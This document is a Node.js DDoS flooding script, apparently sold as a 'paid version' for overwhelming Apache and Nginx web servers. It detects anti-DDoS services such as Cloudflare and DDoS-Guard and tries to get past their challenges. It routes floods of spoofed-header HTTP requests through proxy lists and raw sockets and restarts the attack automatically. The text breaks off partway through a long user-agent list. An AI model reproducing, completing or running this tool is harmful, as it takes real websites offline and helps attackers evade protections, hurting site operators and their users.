var vm = require('vm');
var requestModule = require('request');
var jar = requestModule.jar();
var fs = require('fs');
var proxies = fs.readFileSync(process.argv[4] /*conf.proxy*/ , 'utf-8').replace(/\r/g, '').split('\n');
var EventEmitter = require('events').EventEmitter;
var eventEmitterInfinity = new EventEmitter(Infinity);
eventEmitterInfinity.setMaxListeners(Infinity);
const http = require('http');
const http2 = require('http2');
const emitter = new EventEmitter();
const figlet = require('figlet');
const readyname = figlet.textSync('Mihzayy').cyan;
const chalk = require('chalk');
emitter.setMaxListeners(Number.POSITIVE_INFINITY);
var cheerio = require('cheerio');
var net = require('net-socket');
const execSync = require('child_process').execSync;
var colors = require('colors');
var path = require('path');
var filename = path.basename(__filename);
var cloudscraper = require('cloudscraper');
const url = require('url');
var request = require('request');

const {
    Worker,
    isMainThread,
    parentPort,
    workerData
} = require('worker_threads');
 
function randomStr() {

}

function INIT(workerData) {
    logger('ATTACK STARTING :: ', workerData.target, {
        proxies: workerData.proxies.length,
        opt: workerData.opt
    });

    // STATE:

    const STATE = {
        running: false,
        protection: false,
        expire: 0,
        last: {},
        firewall: false,
        firewalls: [],
        available: ['ddosguard', 'cloudflare', 'blazingfast', 'sucuri', 'stormwall', 'ovh', 'pipeguard']
    }

    const PROPS = []; // All of the settings combined;
    global.l7 = {};
    l7.target = workerData.target;
    l7.parsed = URL.parse(workerData.target);
    l7.mode = workerData.mode;
    if (workerData.opt) {
        l7.opt = workerData.opt;
    } else {
        l7.opt = {
            method: "GET", // HTTP METHOD
            body: true // DEFAULT REQUQEST'S BODY = NO BODY;
        }
    }

    var ATTACK, LOADER, BYPASS = false;

    function initMode() {
        switch (l7.mode) {
            case 'proxy':
                LOADER = flooder.init_proxy;
                ATTACK = flooder.proxy;
                break;
            case 'request':
                LOADER = flooder.init_request;
                ATTACK = flooder.request;
                break;
            case 'websocket':
                LOADER = flooder.init_ws;
                ATTACK = flooder.ws;
                break;
            case 'raw':
                ATTACK();
                l7.raw = true;
                break;
        }
    }

    if (l7.mode == 'raw') {
        ATTACK = function () {
            let dua = flooder.randomUA;
            STATE.running = true; // From now and so, script considered running;
            STATE.expire = Date.now() + workerData.duration;

            setTimeout(() => {
                logger('Attack finished');
                process.exit(4);

            }, STATE.expire - Date.now());
            logger('Starting proxyless :: ', l7.target);
            setInterval(() => {
                reqCookie({
                    method: l7.opt.method,
                    url: l7.target,
                    headers: {
                        'Cache-Control': 'max-age=0',
                        'Upgrade-Insecure-Requests': 1,
                        'User-Agent': dua,
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,/;q=0.8',
                        'Accept-Encoding': 'gzip, deflate, br',
                        'Accept-Language': 'en-US,en;q=0.9'
                    }
                });
            }, 1);
        }
        initMode();
    }

    class Bypass {
        constructor(config) {
            initMode();
            logger('Bypass instance was made :: ', l7.firewall);
            if (l7.firewall) {
                if (STATE.available.includes(l7.firewall[0])) {
                    BYPASS = this.load(l7.firewall[0]);
                } else {
                    BYPASS = this.load('browser_engine');
                }

                if (l7.firewall[1] == false && !BYPASS) {
                    workerData.proxies.forEach(async p => {
                        let dobj = {
                            proxy: 'http://' + p,
                            userAgent: flooder.randomUA
                        };

                        await cloudscraper({
                            url: l7.target,
                            method: "GET",
                            proxy: dobj.proxy,
                            jar: true,
                            followAllRedirects: true,
                            maxRedirects: 20,
                            headers: {
                                'User-Agent': dobj.userAgent
                            }
                        }, async (err, res) => {
                            if (err) return false;
                            if (res.request.headers.cookie) {
                                dobj.cookie = res.request.headers.cookie;
                            }
                            await LOADER(dobj);
                        });
                    })
                    return;
                }

                workerData.proxies.forEach(p => {
                    let dobj = {
                        userAgent: flooder.randomUA,
                        proxy: 'http://' + p
                    }
                    BYPASS(dobj.proxy, dobj.userAgent, async cookie => {
                        dobj.cookie = cookie;
                        await LOADER(dobj);
                    });
                });
            } else {
                workerData.proxies.forEach(p => {
                    let dobj = {
                        proxy: 'http://' + p,
                        userAgent: flooder.randomUA,
                        cookie: false
                    };
                    reqBypass({
                        method: "GET",
                        url: l7.target,
                        proxy: dobj.proxy,
                        headers: {
                            'Cache-Control': 'max-age=0',
                            'Upgrade-Insecure-Requests': 1,
                            'User-Agent': dobj.userAgent,
                            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,/;q=0.8',
                            'Accept-Encoding': 'gzip, deflate, br',
                            'Accept-Language': 'en-US,en;q=0.9'
                        }
                    }, async (err, res, body) => {
                        if (err) return false;
                        if (res.request.headers.cookie) {
                            dobj.cookie = res.request.headers.cookie;
                        }
                        await LOADER(dobj);
                    });
                });

            }
        }

        load(bypassModule) {
            return bypasses[bypassModule]();
        }
    }

    function coinFlip() {
        return (Math.floor(Math.random() * 2) == 0);
    }

    randomByte = function () {
        return Math.round(Math.random() * 256);
    }

    randomIp = function () {
        var ip = randomByte() + '.' +
            randomByte() + '.' +
            randomByte() + '.' +
            randomByte();
        if (isPrivate(ip)) return randomIp();
        return ip;
    }

    isPrivate = function (ip) {
        return /^10\.|^192\.168\.|^172\.16\.|^172\.17\.|^172\.18\.|^172\.19\.|^172\.20\.|^172\.21\.|^172\.22\.|^172\.23\.|^172\.24\.|^172\.25\.|^172\.26\.|^172\.27\.|^172\.28\.|^172\.29\.|^172\.30\.|^172\.31\./.test(ip);
    }


    privateIps = [
        '10.0.0.0',
        '10.255.255.255',
        '172.16.0.0',
        '172.31.255.255',
        '192.168.0.0',
        '192.168.255.255'
    ];

    publicIps = [
        '0.0.0.0',
        '255.255.255.255',
    ];

    class Flood {
        cosntructor(config) {

        }

        get randomReferer() {
            return workerData.referers[~~(Math.random() * workerData.referers.length)]
        }

        get randomProxy() {
            return 'http://' + workerData.proxies[~~(Math.random() * workerData.proxies.length)]
        }

        get randomUA() {
            return workerData.userAgents[~~(Math.random() * workerData.userAgents.length)]
        }

        get randomSpoof() {
            return `${randomIp()}, ${randomIp()}`;
        }

        get realize() {
            return l7.target.replace(/%RAND%/g, randomWords()).replace(/%RAND2%/g, randomStr());
        }

        init(e) {
            e.url = l7.target.replace(/%RAND%/g, randomWords());
            if (l7.opt.body && l7.opt.body.indexOf("%RAND%") !== -1) {
                e.body = l7.opt.body.replace(/%RAND%/g, randomWords());
            }
            if (l7.opt.cookie) {
                l7.opt.cookie = l7.opt.cookie.replace(/%RAND%/g, randomWords());
                if (e.cookie && e.cookie.length >= 4) {
                    e.cookie += '; ' + l7.opt.cookie
                } else {
                    e.cookie = l7.opt.cookie
                };
            }
            return e;
        }

        init_proxy(c) {
            if (c.proxy.indexOf('@') !== -1) {
                //Requires authentication:
                return flooder.init_request(c);
            }
            c = flooder.init(c);
            c.proxy = c.proxy.split('://')[1].split(':');
            ATTACK(c);
        }

        init_request(d) {
            d = flooder.init(d);
            d.url = d.url || l7.target;
            d.method = l7.opt.method;
            d.timeout = 10e3;
            d.insecure = true;
            d.gzip = true;
            d.headers = {
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*;q=0.8',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'en-US,en;q=0.9,he-IL;q=0.8,he;q=0.7,tr;q=0.6',
                'Cache-Control': 'max-age=0',
                'Pragma': 'no-cache',
                'Referer': (coinFlip() ? flooder.randomReferer : d.url),
                'Upgrade-Insecure-Requests': 1,
                'User-Agent': d.userAgent,
                'X-Forwarded-For': flooder.randomSpoof
            }
            if (d.cookie) {
                d.headers['Cookie'] = d.cookie;
            }
            if (l7.opt.headers) {
                Object.keys(l7.opt.headers).forEach(aHeader => {
                    d.headers[aHeader] = l7.opt.headers[aHeader];
                });
            }
            d.proxy = d.proxy;
            PROPS.push(d);
        }

        proxy(a) {
            let stop = Date.now() + 120e3,
                req = () => {
                    if (Date.now() >= stop) {
                        if (netSock.readable && !netSock.destroyed) {
                            resetted ? false : ATTACK(a), resetted = true, netSock.end();
                            netSock.end();
                        }
                        return netSock.destroy();
                    }
                    (netSock.writable && !netSock.destroyed) ? netSock.write(`${l7.opt.method} ${flooder.realize} HTTP/1.1\r\nHost: ${l7.parsed.host}\r\nConnection: Keep-Alive\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate, br${a.cookie ? ('\r\nCookie: ' + a.cookie) : ''}\r\nX-Forwarded-For: ${flooder.randomSpoof}\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nUser-Agent: ${a.userAgent}\r\n\r\n${a.body || l7.opt.body || ""}`): netSock.end();
                }
            var resetted = false,
                netSock = {};

            netSock = net.connect({
                host: a.proxy[0],
                port: a.proxy[1]
            }, async () => {
                for (let j = 0; j < a.proxy[0].length * 6; j++) {
                    await req();
                }
                netSock.on('data', async () => {
                    resetted ? false : ATTACK(a), resetted = true;
                    netSock ? (await req()) : false;
                });
            }).once('disconnect', () => {
                resetted ? netSocket.end() : ATTACK(a), resetted = true;
                return;
            });
        }

        request(b) {
            reqCookie(b);
        }
    }

    // Initialize the flooding system: ( After bypass received cookies, start attacking ~ )

    let flooder = new Flood({
        threads: 1
    });

    class starter {
        init(threads) {
            // Setup flooding interval;

            if (l7.opt.ratelimit) {
                let aprop = 0;

                function sendreq() {
                    reqCookie(PROPS[aprop]);
                    aprop++;
                    if (aprop >= PROPS.length) aprop = 0;
                }
                setInterval(sendreq, 30); // 30ms fight rate limits. Loop through each proxy, more proxies less traffic per ip.
            } else {
                function randomreq() {
                    reqCookie(PROPS[~~(Math.random() * PROPS.length)]);
                }
                for (let v = 0; v < threads; v++) {
                    setInterval(randomreq, threads);
                }
            }
        }
    }

    let Starter = new starter();

    // Initialize Auto protection detection:

    class AutoDetect {
        constructor(cb) {
            logger("New instance of auto detector was made;", l7.target);
            this.cback = cb;
        }

        detect() {
            function detectplz() {
                if (STATE.running) return false;
                let dproxy = flooder.randomProxy,
                    dUA = flooder.randomUA;
                request({
                    method: "GET",
                    url: l7.target,
                    gzip: true,
                    followAllRedirects: true,
                    maxRedirects: 20,
                    agentOptions: {
                        ciphers: 'ECDHE-ECDSA-AES128-GCM-SHA256'
                    },
                    timeout: 80e3,
                    proxy: dproxy,
                    headers: {
                        'Connection': 'keep-alive',
                        'Cache-Control': 'no-cache',
                        'Pragma': 'no-cache',
                        'Upgrade-Insecure-Requests': 1,
                        'User-Agent': flooder.randomUA,
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
                        'Accept-Encoding': 'gzip, deflate, br',
                        'Accept-Language': 'en-US,en;q=0.9',
                        'X-Forwarded-For': flooder.randomSpoof
                    }
                }, (err, res, body) => {
                    if (STATE.running) return false;
                    if (err || !res || !body || res.headers['proxy-connection'] || body.indexOf('Maximum number of open connections reached') !== -1 || body.indexOf('<title>ERROR: The requested URL could not be retrieved</title>') !== -1 || body.indexOf('<title>This is a SOCKS Proxy, Not An HTTP Proxy</title>') !== -1 || body.indexOf('<title>Tor is not an HTTP Proxy</title>') !== -1) {
                        return; // Proxy failed, or an error occured, retry.
                    }

                    if (res.headers['content-length']) {
                        if (res.headers['content-length'] >= 52428800) {
                            return process.exit(8);
                        }
                    }

                    if (res.headers.server == 'cloudflare') {
                        if (res.statusCode == 503 && (body.indexOf("Checking your browser before accessing</") !== -1 || body.indexOf("document.getElementById('challenge-form');") !== -1)) {
                            //Cloudflare UAM Detected:
                            STATE.firewall = ['cloudflare', 'uam'];
                        } else if (res.statusCode == 403 && (res.headers['cf-chl-bypass'] || body.indexOf('<noscript id="cf-captcha-bookmark" class="cf-captcha-info">') !== -1)) {
                            //Cloudflare Captcha Detected:
                            if (res.headers['cf-chl-bypass']) {
                                STATE.firewall = ['cloudflare', 'captcha', true];
                            } else {
                                STATE.firewall = ['cloudflare', 'captcha', false];
                            }
                        } else if (res.statusCode == 403) {
                            reqBypass.get({
                                url: l7.target,
                                proxy: dproxy,
                                headers: {
                                    'Cache-Control': 'max-age=0',
                                    'Upgrade-Insecure-Requests': 1,
                                    'User-Agent': dUA,
                                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,/;q=0.8',
                                    'Accept-Encoding': 'gzip, deflate, br',
                                    'Accept-Language': 'en-US,en;q=0.9'
                                }
                            }, (err, res, body) => {
                                if (err && err.name == 'CaptchaError') {
                                    STATE.firewall = ['cloudflare', 'captcha', false];
                                }
                            });
                        } else {
                            STATE.firewall = ['cloudflare', false]
                        }
                    } else if (res.headers['server'] == 'Sucuri/Cloudproxy' || body.indexOf("{},u,c,U,r,i,l=0") !== -1 && res.headers['x-sucuri-id'] && body.startsWith('<html><title>You are being redirected...</title>')) {
                        STATE.firewall = ['sucuri', 'jschl'];
                    } else if (body.indexOf("<!DOCTYPE html><html><head><title>DDOS-GUARD</title>") !== -1) {
                        STATE.firewall = ['ddosguard', '5sec'];
                        STATE.ratelimit = true;
                    } else if (res.headers['set-cookie'] && res.headers['set-cookie'][0].startsWith('__ddg_=')) {
                        STATE.firewall = ['ddosguard', 'proxy'];
                    } else if (res.headers.server && res.headers['x-hw'] && res.headers.server == 'fbs' && res.headers['x-hw'].startsWith('1')) {
                        STATE.firewall = ['stackpath', false];
                    } else if (res.statusCode == 200 && ['nginx', 'openresty'].indexOf(res.headers.server) !== -1 && res.headers['set-cookie']) {
                        if (res.headers['set-cookie'][0].startsWith('rcksid=')) {
                            STATE.firewall = ['blazingfast', '5sec'];
                        } else if (res.headers['set-cookie'][0].startsWith('BlazingWebCookie=')) {
                            STATE.firewall = ['blazingfast', '5sec2'];
                        }
                    } else if (body.indexOf(';document.cookie="CyberDDoS_') !== -1) {
                        if (body.indexOf('<div w3-include-html="/5s.html"></div>') !== -1) {
                            STATE.firewall = ['cyberddos', '5sec'];
                        } else {
                            STATE.firewall = ['cyberddos', 'silent'];
                        }
                    } else if (res.headers['x-firewall-protection'] && res.headers['x-firewall-protection'] == 'True' && res.statusCode == 200 && res.headers['x-firewall-port'] && res.headers.expires == '0') {
                        STATE.firewall = ['stormwall', 'js'];
                    } else if (res.headers.server && res.headers.server.startsWith('nginx') && res.statusCode == 589 && res.headers['set-cookie'] && res.headers['set-cookie'][0].startsWith('nooder_t=')) {
                        STATE.firewall = ['nooder', 'cookie'];
                    } else if (res.statusCode == 200 && body.startsWith('<html><body><script>setTimeout(eval(function(p,a,c,k,e,d){e=function(c){') && body.endsWith('Please enable JavaScript and Cookies in your browser.</p></noscript></body></html>')) {
                        STATE.firewall = ['ovh', 'js'];
                    } else if (res.statusCode == 200 && body.indexOf('function setCookie() {document.cookie = "PipeGuard=') !== -1 && body.startsWith('<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>Human Verification</title>')) {
                        STATE.firewall = ['pipeguard', 'SetCookie'];
                    }
                    STATE.firewalls.push(STATE.firewall);
                    STATE.last.body = body;
                    STATE.last.res = res;
                });
            }       
            let tryrun = setInterval(() => {
                STATE.running ? clearInterval(tryrun) : setImmediate(detectplz);
                if (STATE.firewalls.length >= 1e3) {
                    //After getting protection detected results; We start flooding and bypassing:
                    STATE.running = true; // From now and so, script considered running;
                    STATE.expire = Date.now() + workerData.duration;

                    if (l7.mode == 'request') 
                    {
                        let tryINIT = () => 
                        {
                            if (PROPS.length > 0) 
                            {
                                Starter.init(4);
                            } 
                            else 
                            {
                                setTimeout(tryINIT, 1e3);
                            }
                        }
                        tryINIT();
                    }
                    setTimeout
                    (
                        () => 
                        {
                             
                           console.log("\x4b[31mAttack finished wait...\x4b[0m");
                           // logger('Attack finished');
                           // process.exit(4);
                           Starter.init(4);
                           console.log("\x4b[35mAttack starting again.\x4b[0m");

                        },
                        STATE.expire - Date.now()
                    );

                    clearInterval(tryrun);

                    for (var i = 0; i < STATE.firewalls.length; i++) 
                    {
                        if (Array.isArray(STATE.firewalls[i])) 
                        {
                            switch (STATE.firewall[0]) 
                            {
                                case 'cloudflare':
                                    STATE.firewall[1] = STATE.firewalls[i][1] !== 'captcha' ? STATE.firewalls[i][1] : STATE.firewall[1];
                                    if (l7.mode !== 'request' && ['captcha', 'uam'].indexOf(STATE.firewall[1]) !== -1) {
                                        l7.mode = 'request';
                                    }
                                    if (STATE.firewall.length == 3) {
                                        if (!STATE.firewall[2]) {
                                            console.warn('[cloudflare-bypass]: The target is not supporting privacypass, now closing rip...');
                                            process.exit(34);
                                        }
                                    }
                                    break;
                                case 'ddosguard':
                                    STATE.firewall[1] = STATE.firewalls[i][1] !== 'proxy' ? STATE.firewalls[i][1] : STATE.firewall[1];
                                    break;
                            }
                            if (!STATE.firewall) STATE.firewall = STATE.firewalls[i];
                        }
                    }
                    l7.firewall = STATE.firewall;
                    this.cback() // Start bypassing :: After bypassed start attacking using "ATTACK" function;
                } else {
                   // logger(STATE.firewalls.length);
                }
            });
        }
    }

    if (!l7.raw) {
        let Detection = new AutoDetect(() => {
            new Bypass();
        });

        Detection.detect();
    }
}

let masterCallbacks = {
    0: res => { new INIT(res); }
}

function ID() {
    return Math.random().toString(36).substr(2, 9);
}

process.on('message', msg => {
    let dfunc = masterCallbacks[0];
    if (dfunc) {
        dfunc.call(null, msg);
        setTimeout(() => {
            delete masterCallbacks[0];
        }, 5e3);
    }
});

global.Fc = (packet, callback) => {
    let op_id = ID(),
        dmsg = {
            data: packet
        }
    if (callback) {
        dmsg._ = packet._ || op_id;
        masterCallbacks[op_id] = callback;
    }
    process.send(dmsg);
}



//le console log sert   a metrre l'image quand tu va lancer le script (: 
console.log("");
    console.log("");
    console.log("\x4b[97m ██████╗  █████╗ ██████╗  ██████╗██╗  ██╗ ██████╗ ");
    console.log("\x4b[97m ██╔══██╗██╔══██╗██╔══██╗██╔════╝██║ ██╔╝██╔═══██╗");
    console.log("\x4b[97m ██║  ██║███████║██████╔╝██║     █████╔╝ ██║   ██║");
    console.log("\x4b[97m ██║  ██║██╔══██║██╔══██╗██║     ██╔═██╗ ██║   ██║");
    console.log("\x4b[97m ██████╔╝██║  ██║██║  ██║╚██████╗██║  ██╗╚██████╔╝");
    console.log("\x4b[97m ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝ ╚═════╝ ");                                      
    console.log("");
    console.log("\033[97m            [\033[31m DARCKO PAID VERSION FOR OVERFLOW SERVER WEB (APACHE & NGINX)\033[31m]\r\n");

    
    console.log("\x4b[36m[^]\x4b[36m Le Script c'est bien lancée > \x4b[36m");
    console.log("\x4b[36m[^]\x4b[36m { URL } >  %s\x4b[36m", process.argv[2]);
    console.log("\x4b[36m[^]\x4b[36m { Temps } >  %s\x4b[36m", process.argv[3]);
    console.log("\x4b[36m[^]\x4b[36m { Proxies } > %s \x4b[36m", process.argv[4]); 
    console.log("\x4b[36m[^]\x4b[36m { Methods } > %s\x4b[36m", process.argv[5]);
    console.log("\x4b[36m[^]\x4b[36m { Cookie } > %s\x4b[36m", process.argv[6]);
    console.log("\x4b[36m[^]\x4b[36m { threads } > %s\x4b[36m",  process.argv[7]);
    console.log("\x4b[36m                                                         \x4b[36m   \x4b[36m");
    console.log("\x4b[36m                                                         \x4b[36m   \x4b[36m");
    console.log("\x4b[36m[^]\x4b[36m ✅ Information: Nothing My Script is Fucking Good ! ✅ > \x4b[36m");
    console.log("\x4b[36m                                                         \x4b[36m   \x4b[36m");
    console.log("\x4b[36m[^]\x4b[36m ✅ Credit: Thanks To SST-DESTROYER.NET AND Mizhayy AND KDM ✅ \x4b[36m");

    
    

if (process.argv.length <= 2) {
    console.log('Usage: node '.white + filename.white.bold + ' <url> <time>'.white.bold);
    process.exit();
}

var request = requestModule.defaults({
        jar: jar
    }),
    UserAgent = ["Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3365.181 Safari/537.36",
        "Mizhayy",
        "SST DESTROYER",
        "FAST-WebCrawler/3.6 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)",
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4362; .NET CLR 3.5.30729; .NET CLR 3.0.30729)",
        "TheSuBot/0.2 (www.thesubot.de)",
        "Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16",
        "BillyBobBot/1.0 (+http://www.billybobbot.com/crawler/)",
        "Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201",
        "FAST-WebCrawler/3.7 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)",
        "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1",
        "zspider/0.9-dev http://feedback.redkolibri.com/",
        "Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)",
        "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51",
        "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36",
        "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194ABaiduspider+(+http://www.baidu.com/search/spider.htm)",
        "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko",
        "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/20090367 Galeon/2.0.7",
        "Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15",
        "Mozilla/5.0 (Android; Linux armv7l; rv:9.0) Gecko/20111216 Firefox/9.0 Fennec/9.0",
        "Mozilla/5.0 (iPhone; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10",
        "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3)",
        "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4362; .NET CLR 2.0.50727)",
        "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5",
        "Opera/9.80 (Windows NT 5.1; U; en) Presto/2.10.229 Version/11.60",
        "Mozilla/5.0 (iPad; U; CPU OS 5_1 like Mac OS X) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B367 Safari/531.21.10 UCBrowser/3.4.3.536",
        "Mozilla/5.0 (Nintendo WiiU) AppleWebKit/536.30 (KHTML, like Gecko) NX/3.0.4.2.12 NintendoBrowser/4.3.1.11264.US",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:25.0) Gecko/20100101 Firefox/25.0",
        "Opera/9.22 (X11; Linux i686; U; de)",
        "Opera/9.22 (Windows NT 6.0; U; ru)",
        "Opera/9.22 (Windows NT 6.0; U; en)",
        "Opera/9.22 (Windows NT 5.1; U; SV1; MEGAUPLOAD 2.0; ru)",
        "Opera/9.22 (Windows NT 5.1; U; SV1; MEGAUPLOAD 1.0; ru)",
        "Opera/9.22 (Windows NT 5.1; U; pl)",
        "Opera/9.22 (Windows NT 5.1; U; fr)",
        "Opera/9.22 (Windows NT 5.1; U; en)",
        "Mozilla/5.0 (Windows NT 5.1; U; en; rv:1.8.0) Gecko/20060728 Firefox/1.5.0 Opera 9.22",
        "Mozilla/4.0 (compatible; MSIE 6.0; X11; Linux i686; en) Opera 9.22",
        "Opera/9.21 (X11; Linux x86_64; U; en)",
        "Opera/9.21 (X11; Linux i686; U; es-es)",
        "Opera/9.21 (X11; Linux i686; U; en)",
        "Opera/9.21 (X11; Linux i686; U; de)",
        "Opera/9.21 (Windows NT 6.0; U; nb)",
        "Opera/9.21 (Windows NT 6.0; U; en)",
        "Opera/9.21 (Windows NT 5.2; U; en)",
        "Opera/9.21 (Windows NT 5.1; U; SV1; MEGAUPLOAD 1.0; ru)",
        "Opera/9.21 (Windows NT 5.1; U; ru)",
        "Opera/9.21 (Windows NT 5.1; U; pt-br)",
        "Opera/9.21 (Windows NT 5.1; U; pl)",
        "Opera/9.21 (Windows NT 5.1; U; nl)",
        "Opera/9.21 (Windows NT 5.1; U; MEGAUPLOAD 1.0; en)",
        "Opera/9.21 (Windows NT 5.1; U; fr)",
        "Opera/9.21 (Windows NT 5.1; U; en)",
        "Opera/9.21 (Windows NT 5.1; U; de)",
        "Opera/9.21 (Windows NT 5.0; U; de)",
        "Opera/9.21 (Windows 98; U; en)",
        "Opera/9.21 (Macintosh; PPC Mac OS X; U; en)",
        "Opera/9.21 (Macintosh; Intel Mac OS X; U; en)",
        "More Opera 9.21 user agents strings -->>",
        "Opera/9.20(Windows NT 5.1; U; en)",
        "Opera/9.20 (X11; Linux x86_64; U; en)",
        "Opera/9.20 (X11; Linux ppc; U; en)",
        "Opera/9.20 (X11; Linux i686; U; tr)",
        "Opera/9.20 (X11; Linux i686; U; ru)",
        "Opera/9.20 (X11; Linux i686; U; pl)",
        "Opera/9.20 (X11; Linux i686; U; es-es)",
        "Opera/9.20 (X11; Linux i686; U; en)",
        "Opera/9.20 (X11; Linux i586; U; en)",
        "Opera/9.20 (Windows NT 6.0; U; es-es)",
        "Opera/9.20 (Windows NT 6.0; U; en)",
        "Opera/9.20 (Windows NT 6.0; U; de)",
        "Opera/9.20 (Windows NT 5.2; U; en)",
        "Opera/9.20 (Windows NT 5.1; U; zh-tw)",
        "Opera/9.20 (Windows NT 5.1; U; nb)",
        "Opera/9.20 (Windows NT 5.1; U; MEGAUPLOAD=1.0; es-es)",
        "Opera/9.20 (Windows NT 5.1; U; it)",
        "Opera/9.20 (Windows NT 5.1; U; es-es)",
        "Opera/9.20 (Windows NT 5.1; U; es-AR)",
        "Opera/9.20 (Windows NT 5.1; U; en)",
        "More Opera 9.20 user agents strings -->>",
        "Opera/9.12 (X11; Linux i686; U; en) (Ubuntu)",
        "Opera/9.12 (Windows NT 5.0; U; ru)",
        "Opera/9.12 (Windows NT 5.0; U)",
        "Opera/9.10 (X11; Linux; U; en)",
        "Opera/9.10 (X11; Linux x86_64; U; en)",
        "Opera/9.10 (X11; Linux i686; U; pl)",
        "Opera/9.10 (X11; Linux i686; U; kubuntu;pl)",
        "Opera/9.10 (X11; Linux i686; U; en)",
        "Opera/9.10 (X11; Linux i386; U; en)",
        "Opera/9.10 (Windows NT 6.0; U; it-IT)",
        "Opera/9.10 (Windows NT 6.0; U; en)",
        "Opera/9.10 (Windows NT 5.2; U; en)",
        "Opera/9.10 (Windows NT 5.2; U; de)",
        "Opera/9.10 (Windows NT 5.1; U; zh-tw)",
        "Opera/9.10 (Windows NT 5.1; U; sv)",
        "Opera/9.10 (Windows NT 5.1; U; pt)",
        "Opera/9.10 (Windows NT 5.1; U; pl)",
        "Opera/9.10 (Windows NT 5.1; U; nl)",
        "Opera/9.10 (Windows NT 5.1; U; MEGAUPLOAD 1.0; pl)",
        "Opera/9.10 (Windows NT 5.1; U; it)",
        "Opera/9.10 (Windows NT 5.1; U; hu)",
        "Opera/9.10 (Windows NT 5.1; U; fi)",
        "Opera/9.10 (Windows NT 5.1; U; es-es)",
        "More Opera 9.10 user agents strings -->>",
        "Opera/9.02 (X11; Linux i686; U; pl)",
        "Opera/9.02 (X11; Linux i686; U; hu)",
        "Opera/9.02 (X11; Linux i686; U; en)",
        "Opera/9.02 (X11; Linux i686; U; de)",
        "Opera/9.02 (Windows; U; nl)",
        "Opera/9.02 (Windows XP; U; ru)",
        "Opera/9.02 (Windows NT 5.2; U; en)",
        "Opera/9.02 (Windows NT 5.2; U; de)",
        "Opera/9.02 (Windows NT 5.1; U; zh-cn)",
        "Opera/9.02 (Windows NT 5.1; U; ru)",
        "Opera/9.02 (Windows NT 5.1; U; pt-br)",
        "Opera/9.02 (Windows NT 5.1; U; pl)",
        "Opera/9.02 (Windows NT 5.1; U; nb)",
        "Opera/9.02 (Windows NT 5.1; U; ja)",
        "Opera/9.02 (Windows NT 5.1; U; fi)",
        "Opera/9.02 (Windows NT 5.1; U; en)",
        "Opera/9.02 (Windows NT 5.1; U; de)",
        "Opera/9.02 (Windows NT 5.0; U; sv)",
        "Opera/9.02 (Windows NT 5.0; U; pl)",
        "Opera/9.02 (Windows NT 5.0; U; en)",
        "More Opera 9.02 user agents strings -->>",
        "Opera/9.01 (X11; OpenBSD i386; U; en)",
        "Opera/9.01 (X11; Linux i686; U; en)",
        "Opera/9.01 (X11; FreeBSD 6 i386; U;pl)",
        "Opera/9.01 (X11; FreeBSD 6 i386; U; en)",
        "Opera/9.01 (Windows NT 5.2; U; ru)",
        "Opera/9.01 (Windows NT 5.2; U; en)",
        "Opera/9.01 (Windows NT 5.1; U; ru)",
        "Opera/9.01 (Windows NT 5.1; U; pl)",
        "Opera/9.01 (Windows NT 5.1; U; ja)",
        "Opera/9.01 (Windows NT 5.1; U; es-es)",
        "Opera/9.01 (Windows NT 5.1; U; en)",
        "Opera/9.01 (Windows NT 5.1; U; de)",
        "Opera/9.01 (Windows NT 5.1; U; da)",
        "Opera/9.01 (Windows NT 5.1; U; cs)",
